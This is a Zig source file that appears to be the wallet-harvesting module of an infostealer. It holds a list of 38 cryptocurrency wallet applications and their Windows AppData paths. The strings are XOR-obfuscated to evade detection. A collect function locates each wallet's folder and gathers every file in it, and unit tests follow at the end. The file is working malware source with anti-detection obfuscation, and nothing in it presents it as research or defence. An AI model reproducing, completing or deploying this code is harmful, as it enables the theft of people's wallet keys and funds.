const std = @import("std");
const hash = @import("../types/hash.zig");

pub const DesktopWallet = struct {
    name: []const u8,
    path: []const u8,
    files: [][]const u8,
};

const E = struct {
    pub const names = [38][]const u8{
        &hash.xorEncrypt("Exodus"),
        &hash.xorEncrypt("Electrum"),
        &hash.xorEncrypt("Atomic"),
        &hash.xorEncrypt("Wasabi"),
        &hash.xorEncrypt("Coinomi"),
        &hash.xorEncrypt("Guarda"),
        &hash.xorEncrypt("Jaxx Liberty"),
        &hash.xorEncrypt("MultiBitHD"),
        &hash.xorEncrypt("Zcash"),
        &hash.xorEncrypt("Monero"),
        &hash.xorEncrypt("Bitcoin Core"),
        &hash.xorEncrypt("Litecoin Core"),
        &hash.xorEncrypt("Dogecoin Core"),
        &hash.xorEncrypt("Dash Core"),
        &hash.xorEncrypt("Armory"),
        &hash.xorEncrypt("Bytecoin"),
        &hash.xorEncrypt("MultiDoge"),
        &hash.xorEncrypt("ElectrumLTC"),
        &hash.xorEncrypt("ElectronCash"),
        &hash.xorEncrypt("Zcoin"),
        &hash.xorEncrypt("BitcoinGold"),
        &hash.xorEncrypt("Ethereum"),
        &hash.xorEncrypt("Binance"),
        &hash.xorEncrypt("Ledger Live"),
        &hash.xorEncrypt("Trezor Suite"),
        &hash.xorEncrypt("MyEtherWallet"),
        &hash.xorEncrypt("MyCrypto"),
        &hash.xorEncrypt("MetaMask"),
        &hash.xorEncrypt("TrustWallet"),
        &hash.xorEncrypt("Bitcoin"),
        &hash.xorEncrypt("Litecoin"),
        &hash.xorEncrypt("Dash"),
        &hash.xorEncrypt("Vertcoin"),
        &hash.xorEncrypt("Groestlcoin"),
        &hash.xorEncrypt("Komodo"),
        &hash.xorEncrypt("PIVX"),
        &hash.xorEncrypt("MyMonero"),
        &hash.xorEncrypt("Jaxx"),
    };
    pub const paths = [38][]const u8{
        &hash.xorEncrypt("Exodus\\exodus.wallet"),
        &hash.xorEncrypt("Electrum\\wallets"),
        &hash.xorEncrypt("atomic\\Local Storage\\leveldb"),
        &hash.xorEncrypt("WalletWasabi\\Client\\Wallets"),
        &hash.xorEncrypt("Coinomi\\Coinomi\\wallets"),
        &hash.xorEncrypt("Guarda\\Local Storage\\leveldb"),
        &hash.xorEncrypt("Jaxx Liberty\\Local Storage\\leveldb"),
        &hash.xorEncrypt("MultiBitHD"),
        &hash.xorEncrypt("Zcash"),
        &hash.xorEncrypt("monero-project\\monero-core\\wallets"),
        &hash.xorEncrypt("Bitcoin"),
        &hash.xorEncrypt("Litecoin"),
        &hash.xorEncrypt("DogeCoin"),
        &hash.xorEncrypt("DashCore"),
        &hash.xorEncrypt("Armory"),
        &hash.xorEncrypt("bytecoin"),
        &hash.xorEncrypt("MultiDoge"),
        &hash.xorEncrypt("Electrum-LTC"),
        &hash.xorEncrypt("ElectronCash"),
        &hash.xorEncrypt("Firo"),
        &hash.xorEncrypt("BitcoinGold"),
        &hash.xorEncrypt("Ethereum\\keystore"),
        &hash.xorEncrypt("Binance\\Local Storage\\leveldb"),
        &hash.xorEncrypt("Ledger Live"),
        &hash.xorEncrypt("Trezor Suite"),
        &hash.xorEncrypt("MyEtherWallet"),
        &hash.xorEncrypt("MyCrypto"),
        &hash.xorEncrypt("MetaMask"),
        &hash.xorEncrypt("TrustWallet"),
        &hash.xorEncrypt("Bitcoin"),
        &hash.xorEncrypt("Litecoin"),
        &hash.xorEncrypt("Dash"),
        &hash.xorEncrypt("Vertcoin"),
        &hash.xorEncrypt("Groestlcoin"),
        &hash.xorEncrypt("Komodo"),
        &hash.xorEncrypt("PIVX"),
        &hash.xorEncrypt("MyMonero"),
        &hash.xorEncrypt("com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb"),
    };
};

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn listFiles(allocator: std.mem.Allocator, dir_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();

    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
        try files.append(full);
    }

    return try files.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8) ![]DesktopWallet {
    var wallets = std.ArrayList(DesktopWallet).init(allocator);
    errdefer {
        for (wallets.items) |w| {
            allocator.free(w.name);
            allocator.free(w.path);
            for (w.files) |f| allocator.free(f);
            allocator.free(w.files);
        }
        wallets.deinit();
    }

    inline for (0..38) |i| {
        const pe = E.paths[i];
        var path_buf: [pe.len]u8 = undefined;
        hash.xorDecrypt(pe, &path_buf);

        const full_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, &path_buf });
        if (!dirExists(full_path)) {
            allocator.free(full_path);
            continue;
        }

        const files = listFiles(allocator, full_path) catch |err| {
            allocator.free(full_path);
            if (err == error.FileNotFound or err == error.NotDir or err == error.AccessDenied) continue;
            return err;
        };

        const ne = E.names[i];
        var name_buf: [ne.len]u8 = undefined;
        hash.xorDecrypt(ne, &name_buf);

        const name = try allocator.dupe(u8, &name_buf);
        try wallets.append(DesktopWallet{ .name = name, .path = full_path, .files = files });
    }

    return try wallets.toOwnedSlice();
}

test "desktop wallet count" {
    try std.testing.expect(E.names.len == 38);
}

test "first desktop wallet is Exodus" {
    var buf: [E.names[0].len]u8 = undefined;
    hash.xorDecrypt(E.names[0], &buf);
    try std.testing.expectEqualSlices(u8, "Exodus", &buf);
}

test "last desktop wallet is Jaxx" {
    var buf: [E.names[37].len]u8 = undefined;
    hash.xorDecrypt(E.names[37], &buf);
    try std.testing.expectEqualSlices(u8, "Jaxx", &buf);
}

test "collect returns empty for nonexistent roaming" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__");
    defer {
        for (result) |w| {
            std.testing.allocator.free(w.name);
            std.testing.allocator.free(w.path);
            for (w.files) |f| std.testing.allocator.free(f);
            std.testing.allocator.free(w.files);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "dirExists returns false for nonexistent path" {
    try std.testing.expect(!dirExists("C:\\__nonexistent__dir__"));
}
